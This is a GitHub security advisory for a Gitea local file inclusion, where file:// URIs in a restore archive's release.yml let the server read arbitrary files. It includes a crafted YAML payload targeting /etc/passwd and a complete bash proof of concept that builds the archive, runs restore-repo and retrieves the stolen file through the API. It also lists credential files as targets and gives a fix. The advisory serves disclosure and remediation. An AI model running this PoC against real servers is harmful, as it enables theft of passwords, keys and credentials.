# [M] Gitea: Local File Inclusion via file:// URI in Migration Restore

## Summary
Severity: Medium
Advisory: GHSA-5ggr-2f2h-jmvm
CVE: CVE-2026-58420
CWE: CWE-73
Ecosystem: Go
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-5ggr-2f2h-jmvm
Type: github-advisory

## Affected
- Go: `gitea.dev` — affected >=0 <1.27.0

## Details
# Local File Inclusion via file:// URI in Migration Restore

Target: go-gitea/gitea
Component: services/migrations/gitea_uploader.go, modules/uri/uri.go
Severity: High
Affected Versions: <= v1.22.x (all releases), master as of latest commit
Researchers:
- Isa Can — Eresus Security (https://github.com/isa0-gh)
- Yigit Ibrahim — Eresus Security (https://github.com/ibrahmsql)

---

## Summary

Gitea's restore-repo command processes release.yml files from a user-supplied archive. The DownloadURL field in each release attachment is passed to uri.Open() without scheme validation. Because uri.Open() supports the file:// scheme via os.Open(), an operator-level attacker can plant a crafted release.yml to exfiltrate arbitrary files from the server filesystem as release attachments.

---

## Impact

An attacker who can supply a crafted archive to the restore-repo command can read any file accessible to the Gitea process user on the host filesystem. Sensitive targets include:

- app.ini — containing database passwords and secret keys
- SSH private keys (~/.ssh/id_rsa, /etc/ssh/ssh_host_*)
- TLS certificates and private keys
- Cloud provider credential files (e.g. ~/.aws/credentials)
- Any other file readable by the Gitea process user

The exfiltrated content is silently stored as a release attachment and retrievable via the Gitea API.

---

## Affected Code

### modules/uri/uri.go
```
func Open(rawURL string) (io.ReadCloser, error) {
    u, err := url.Parse(rawURL)
    if err != nil {
        return nil, err
    }
    switch u.Scheme {
    case "http", "https":
        resp, err := http.Get(rawURL)
        ...
    case "file":
        return os.Open(u.Path) // no scheme validation, no path restriction
    }
}
```
### services/migrations/gitea_uploader.go (~line 370)
```
func (g *GiteaLocalUploader) CreateReleases(releases ...*base.Release) error {
    for _, rel := range releases {
        for _, asset := range rel.Assets {
            rc, err := uri.Open(asset.DownloadURL) // user-controlled, unvalidated
            ...
            // file content saved as release attachment
        }
    }
}
```
---

## Attack Scenario

An attacker with admin or operator access (or the ability to supply a crafted archive to an admin who runs restore-repo) can:

1. Create a malicious archive containing release.yml:
```
releases:
  - tag_name: v0.0.1
    assets:
      - name: exfiltrated.txt
        download_url: "file:///etc/passwd"
```
2. Run restore:
```
gitea restore-repo --zip-path ./malicious.zip --owner target-org --repo test-repo
```
3. The server reads /etc/passwd and stores it as a release attachment named exfiltrated.txt.

4. Retrieve via API:
```
curl -s "http://gitea.example.com/api/v1/repos/target-org/test-repo/releases/latest/assets" \
  -H "Authorization: token ADMIN_TOKEN" | jq -r '.[].browser_download_url'
```
---

## PoC
> Note: restore-repo must be executed on the host running the Gitea instance, or by an operator with direct server access.
```
#!/usr/bin/env bash
# PoC: Gitea LFI via release.yml DownloadURL
# Requires: admin credentials, gitea binary on PATH (server host)

GITEA_URL="${1:-http://localhost:3000}"
ADMIN_TOKEN="${2:-REPLACE_ME}"
TARGET_FILE="${3:-/etc/passwd}"
OWNER="test-org"
REPO="lfi-test"
```
# 1. Create target org and repo via API
```
curl -sf -X POST "$GITEA_URL/api/v1/orgs" \
  -H "Authorization: token $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$OWNER\",\"visibility\":\"private\"}" || true

curl -sf -X POST "$GITEA_URL/api/v1/user/repos" \
  -H "Authorization: token $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$REPO\",\"private\":true,\"auto_init\":true}" || true
```
# 2. Build malicious archive
```
TMP=$(mktemp -d)
mkdir -p "$TMP/bundles/$OWNER/$REPO"

cat > "$TMP/bundles/$OWNER/$REPO/release.yml" <<YAML
releases:
  - tag_name: v0.0.1
    name: test
    body: ""
    draft: false
    prerelease: false
    assets:
      - name: output.txt
        download_url: "file://$TARGET_FILE"
        size: 0
        download_count: 0
YAML

cd "$TMP" && zip -r poc.zip bundles/
````
# 3. Trigger restore
```
gitea restore-repo \
  --zip-path "$TMP/poc.zip" \
  --owner "$OWNER" \
  --repo "$REPO" \
  --units release 2>&1
```
# 4. Retrieve exfiltrated content
```
echo "[*] Fetching exfiltrated content..."
RELEASE_ID=$(curl -sf "$GITEA_URL/api/v1/repos/$OWNER/$REPO/releases?limit=1" \
  -H "Authorization: token $ADMIN_TOKEN" | jq -r '.[0].id')

curl -sf "$GITEA_URL/api/v1/repos/$OWNER/$REPO/releases/$RELEASE_ID/assets" \
  -H "Authorization: token $ADMIN_TOKEN" | jq -r '.[0].browser_download_url' | \
  xargs -I{} curl -sf "{}" -H "Authorization: token $ADMIN_TOKEN"

rm -rf "$TMP"
```
---

## Root Cause

uri.Open() was designed as an internal utility to support both remote (http/https) and local (file://) resources during migrations. This dual-scheme design is intentional for same-host migration workflows. However, the function is also invoked in gitea_uploader.go on the DownloadURL field sourced directly from user-supplied archive content, with no validation that the scheme is restricted to http or https. The absence of any allowlist or scheme check at the call site creates a direct, exploitable path from attacker-controlled input to arbitrary server-side file reads.

---

## Fix Recommendation

In services/migrations/gitea_uploader.go, validate asset.DownloadURL before calling uri.Open():
```
parsed, err := url.Parse(asset.DownloadURL)
if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
    log.Warn("Skipping release asset with non-HTTP URL: %s", asset.DownloadURL)
    continue
}
rc, err := uri.Open(asset.DownloadURL)
Alternatively, replace calls to uri.Open() in the migration path with a dedicated HTTP-only fetcher to eliminate the file:// code path entirely from user-controlled contexts.
```
---

## Workaround

Until a patch is available, operators should:

- Restrict restore-repo execution to fully trusted operators only
- Audit all archive contents manually before running restoration
- Review existing release attachments for unexpected or sensitive filenames

---

Isa Can
Security Researcher — Eresus Security
https://github.com/isa0-gh

Yigit Ibrahim
Security Researcher — Eresus Security
https://github.com/ibrahmsql

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-5ggr-2f2h-jmvm
- https://github.com/go-gitea/gitea
